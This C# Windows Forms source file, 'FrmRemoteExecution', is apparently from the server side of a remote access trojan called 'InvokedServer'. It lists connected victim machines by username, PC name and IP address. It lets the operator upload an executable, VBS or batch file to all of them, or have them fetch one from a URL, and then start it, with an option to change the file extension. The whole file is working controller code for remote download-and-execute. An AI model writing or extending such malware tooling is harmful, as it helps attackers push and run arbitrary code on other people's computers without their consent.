

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Models;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmRemoteExecution : Form
	{
		private readonly Client[] _clients;
		private readonly List<FrmRemoteExecution.RemoteExecutionMessageHandler> _remoteExecutionMessageHandlers;
		private bool _isUpdate;

		public FrmRemoteExecution(Client[] clients)
		{
			this._clients = clients;
			this._remoteExecutionMessageHandlers = new List<FrmRemoteExecution.RemoteExecutionMessageHandler>(clients.Length);
			this.InitializeComponent();
			foreach (Client client in clients)
			{
				FrmRemoteExecution.RemoteExecutionMessageHandler remoteExecutionMessageHandler = new FrmRemoteExecution.RemoteExecutionMessageHandler()
				{
					FileHandler = new FileManagerHandler(client),
					TaskHandler = new TaskManagerHandler(client)
				};
				this.lstTransfers.Items.Add(new ListViewItem(new string[2]
				{
		  string.Format("{0}@{1} [{2}:{3}]", (object) client.Value.Username, (object) client.Value.PcName, (object) client.EndPoint.Address, (object) client.EndPoint.Port),
		  "Waiting..."
				})
				{
					Tag = (object)remoteExecutionMessageHandler
				});
				this._remoteExecutionMessageHandlers.Add(remoteExecutionMessageHandler);
				this.RegisterMessageHandler(remoteExecutionMessageHandler);
			}
		}

		private void RegisterMessageHandler(
		  FrmRemoteExecution.RemoteExecutionMessageHandler remoteExecutionMessageHandler)
		{
			remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed += new TaskManagerHandler.ProcessActionPerformedEventHandler(this.ProcessActionPerformed);
			remoteExecutionMessageHandler.FileHandler.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.SetStatusMessage);
			remoteExecutionMessageHandler.FileHandler.FileTransferUpdated += new FileManagerHandler.FileTransferUpdatedEventHandler(this.FileTransferUpdated);
			MessageHandler.Register((IMessageProcessor)remoteExecutionMessageHandler.FileHandler);
			MessageHandler.Register((IMessageProcessor)remoteExecutionMessageHandler.TaskHandler);
		}

		private void UnregisterMessageHandler(
		  FrmRemoteExecution.RemoteExecutionMessageHandler remoteExecutionMessageHandler)
		{
			MessageHandler.Unregister((IMessageProcessor)remoteExecutionMessageHandler.TaskHandler);
			MessageHandler.Unregister((IMessageProcessor)remoteExecutionMessageHandler.FileHandler);
			remoteExecutionMessageHandler.FileHandler.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.SetStatusMessage);
			remoteExecutionMessageHandler.FileHandler.FileTransferUpdated -= new FileManagerHandler.FileTransferUpdatedEventHandler(this.FileTransferUpdated);
			remoteExecutionMessageHandler.TaskHandler.ProcessActionPerformed -= new TaskManagerHandler.ProcessActionPerformedEventHandler(this.ProcessActionPerformed);
		}

		private void FrmRemoteExecution_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("Remote Execution", this._clients.Length);
		}

		private void FrmRemoteExecution_FormClosing(object sender, FormClosingEventArgs e)
		{
			foreach (FrmRemoteExecution.RemoteExecutionMessageHandler executionMessageHandler in this._remoteExecutionMessageHandlers)
			{
				this.UnregisterMessageHandler(executionMessageHandler);
				executionMessageHandler.FileHandler.Dispose();
			}
			this._remoteExecutionMessageHandlers.Clear();
			this.lstTransfers.Items.Clear();
		}

		private void btnExecute_Click(object sender, EventArgs e)
		{
			this._isUpdate = this.chkUpdate.Checked;
			if (this.radioURL.Checked)
			{
				foreach (FrmRemoteExecution.RemoteExecutionMessageHandler executionMessageHandler in this._remoteExecutionMessageHandlers)
				{
					if (!this.txtURL.Text.StartsWith("http"))
						this.txtURL.Text = "http://" + this.txtURL.Text;
					string fileExtension = "exe";
					if (this.ChangeFileExtensionCheckBox.Checked)
						fileExtension = this.FileExtensiontextBox.Text;
					executionMessageHandler.TaskHandler.StartProcessFromWeb(this.txtURL.Text, this._isUpdate, fileExtension);
				}
			}
			else
			{
				foreach (FrmRemoteExecution.RemoteExecutionMessageHandler executionMessageHandler in this._remoteExecutionMessageHandlers)
				{
					string fileExtension = ((IEnumerable<string>)this.txtPath.Text.Split('.')).Last<string>();
					if (fileExtension != null)
						executionMessageHandler.FileHandler.BeginUploadFile(this.txtPath.Text, fileExtension: fileExtension);
					else
						executionMessageHandler.FileHandler.BeginUploadFile(this.txtPath.Text);
				}
			}
		}

		private void btnBrowse_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Multiselect = false;
				openFileDialog.Filter = "Executable (*.exe)|*.exe|VBS Script (*.vbs*)|*.vbs*|Batch (*.bat*)|*.bat*|All Files (*.*)|*.*";
				if (openFileDialog.ShowDialog() != DialogResult.OK)
					return;
				this.txtPath.Text = Path.Combine(openFileDialog.InitialDirectory, openFileDialog.FileName);
			}
		}

		private void radioLocalFile_CheckedChanged(object sender, EventArgs e)
		{
			this.groupLocalFile.Enabled = this.radioLocalFile.Checked;
			this.groupURL.Enabled = !this.radioLocalFile.Checked;
		}

		private void radioURL_CheckedChanged(object sender, EventArgs e)
		{
			this.groupLocalFile.Enabled = !this.radioURL.Checked;
			this.groupURL.Enabled = this.radioURL.Checked;
		}

		private void FileTransferUpdated(object sender, FileTransfer transfer)
		{
			for (int index = 0; index < this.lstTransfers.Items.Count; ++index)
			{
				FrmRemoteExecution.RemoteExecutionMessageHandler tag = (FrmRemoteExecution.RemoteExecutionMessageHandler)this.lstTransfers.Items[index].Tag;
				if (tag.FileHandler.Equals((object)(sender as FileManagerHandler)) || tag.TaskHandler.Equals((object)(sender as TaskManagerHandler)))
				{
					this.lstTransfers.Items[index].SubItems[1].Text = transfer.Status;
					if (!(transfer.Status == "Completed"))
						break;
					tag.TaskHandler.StartProcess(transfer.RemotePath, this._isUpdate);
					break;
				}
			}
		}

		private void SetStatusMessage(object sender, string message)
		{
			for (int index = 0; index < this.lstTransfers.Items.Count; ++index)
			{
				FrmRemoteExecution.RemoteExecutionMessageHandler tag = (FrmRemoteExecution.RemoteExecutionMessageHandler)this.lstTransfers.Items[index].Tag;
				if (tag.FileHandler.Equals((object)(sender as FileManagerHandler)) || tag.TaskHandler.Equals((object)(sender as TaskManagerHandler)))
				{
					this.lstTransfers.Items[index].SubItems[1].Text = message;
					break;
				}
			}
		}

		private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
		{
			if (action != ProcessAction.Start)
				return;
			for (int index = 0; index < this.lstTransfers.Items.Count; ++index)
			{
				FrmRemoteExecution.RemoteExecutionMessageHandler tag = (FrmRemoteExecution.RemoteExecutionMessageHandler)this.lstTransfers.Items[index].Tag;
				if (tag.FileHandler.Equals((object)(sender as FileManagerHandler)) || tag.TaskHandler.Equals((object)(sender as TaskManagerHandler)))
				{
					this.lstTransfers.Items[index].SubItems[1].Text = result ? "Successfully started process" : "Failed to start process";
					break;
				}
			}
		}

		private void ChangeFileExtensionCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			this.FileExtensiontextBox.Enabled = this.ChangeFileExtensionCheckBox.Checked;
		}

		private class RemoteExecutionMessageHandler
		{
			public FileManagerHandler FileHandler;
			public TaskManagerHandler TaskHandler;
		}

		private enum TransferColumn
		{
			Client,
			Status,
		}
	}
}